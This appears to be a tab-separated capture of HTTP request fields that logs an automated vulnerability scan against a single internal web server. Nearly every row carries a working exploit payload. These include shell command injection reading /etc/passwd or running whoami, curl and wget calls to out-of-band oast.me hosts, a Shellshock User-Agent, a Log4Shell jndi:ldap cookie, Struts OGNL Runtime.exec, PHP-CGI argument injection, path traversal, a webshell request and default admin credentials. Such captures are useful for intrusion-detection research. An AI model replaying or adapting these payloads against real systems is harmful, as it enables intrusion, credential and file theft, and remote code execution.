http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	gzip																close		158	158	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=action_name		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-admin/admin-ajax.php?action=action_name
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cf_scripts/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/cf_scripts/scripts/ajax/package/cfajax.js
	gzip																close		38	38	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/webmail/basic/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/webmail/basic/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/confluence/pages/createpage-entervariables.action		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/confluence/pages/createpage-entervariables.action
	gzip																close		73	73	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/SDK/webLanguage		PUT				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/SDK/webLanguage
*/*	gzip	en															close		1176	1176	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/console/images/%252e%252e%252fconsole.portal		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/console/images/%252e%252e%252fconsole.portal
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/owa/auth/x.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36			X-AnonResource=true; X-AnonResource-Backend=c8ach799m8v918fkv9igcekcteayyyyba.oast.me/ecp/default.flt?~3;	/web/owa/auth/x.js
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/manage/webshell/u?s=5&w=218&h=15&k=%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a&l=62&_=5621298674064		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/manage/webshell/u?s=5&w=218&h=15&k=%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a&l=62&_=5621298674064
*/*	gzip, deflate																close		80	80	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/scripts/setup.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/scripts/setup.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/command.cgi?cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/command.cgi?cat%20/etc/passwd
*/*	gzip	en															close		49	49	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybk.oast.me%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybc.oast.me%7D;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybk.oast.me%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybc.oast.me%7D;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekctjyyyyyb4.oast.me%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekctjyyyyybh.oast.me%7D;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekctjyyyyyb4.oast.me%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekctjyyyyybh.oast.me%7D;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/assets/backend/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/assets/backend/elfinder/elfinder-cke.html
*/*	gzip	en															close		575	575	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/poc.jsp/		PUT				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/poc.jsp/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,	gzip																close		569	569	text/xml;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wls-wsat/RegistrationRequesterPortType		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/wls-wsat/RegistrationRequesterPortType
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/assets/elFinder-2.1.9/elfinder.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/assets/elFinder-2.1.9/elfinder.html
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lcms/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/lcms/index.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/reports/rwservlet/showenv		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/reports/rwservlet/showenv
*/*	gzip	en															close		26	26	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://example.com%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://example.com%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
	gzip																close		106	106	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/./RestAPI/Connection		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/./RestAPI/Connection
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/reports/rwservlet?report=test.rdf&desformat=html&destype=cache&JOBTYPE=rwurl&URLPARAMETER=file:///		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/reports/rwservlet?report=test.rdf&desformat=html&destype=cache&JOBTYPE=rwurl&URLPARAMETER=file:///
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/webtools/control/main		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36			OFBiz.Visitor=${jndi:ldap://${hostName}.c8ach799m8v918fkv9igcekctjyyyyyny.oast.me}	/web/webtools/control/main
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/lui/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/lui/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ajax/networking/get_netcfg.php?iface=;curl%20http://c8ach799m8v918fkv9igcekctjyyyyynn.oast.me/`whoami`;		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/ajax/networking/get_netcfg.php?iface=;curl%20http://c8ach799m8v918fkv9igcekctjyyyyynn.oast.me/`whoami`;
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36			PHPSESSID=25SnElQMF0dQm3Kkn3fgNL24Mk0;	/web/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";
application/json	gzip																close		631	631	multipart/form-data; boundary=---------------------------99533888113153068481322586663						192.168.1.104														192.168.1.104/user/register	1	http://192.168.1.104/web/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/assets/elFinder/elfinder.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/assets/elFinder/elfinder.html
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/help/admin-guide/test.jsp		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/help/admin-guide/test.jsp
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/status		GET				HTTP/1.1																			() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'				/web/cgi-bin/status
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/stat.jsp?cmd=chcp+437+%7c+dir		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/stat.jsp?cmd=chcp+437+%7c+dir
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9																											192.168.1.104															1	http://192.168.1.104/web/?author=1		GET				HTTP/1.1																							/web/?author=1
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/hub/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/hub/
	gzip																close		226	226	text/plain						192.168.1.104														http://192.168.1.104/mainFrame.htm	1	http://192.168.1.104/web/cgi?2		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36			Authorization=Basic YWRtaW46YWRtaW4=	/web/cgi?2
	gzip																close		87	87	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/upload		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/upload
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/backend/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/backend/elfinder/elfinder-cke.html
	gzip																close		8	8	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lucee/admin/imgProcess.cfm?file=/whatever		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/lucee/admin/imgProcess.cfm?file=/whatever
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/poc.jsp?cmd=cat+%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/poc.jsp?cmd=cat+%2Fetc%2Fpasswd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/script/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/script/
	gzip		admin:password						Basic YWRtaW46cGFzc3dvcmQ=								close		139	139	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/boafrm/formSysCmd		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/boafrm/formSysCmd
	gzip																close		44	44	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27
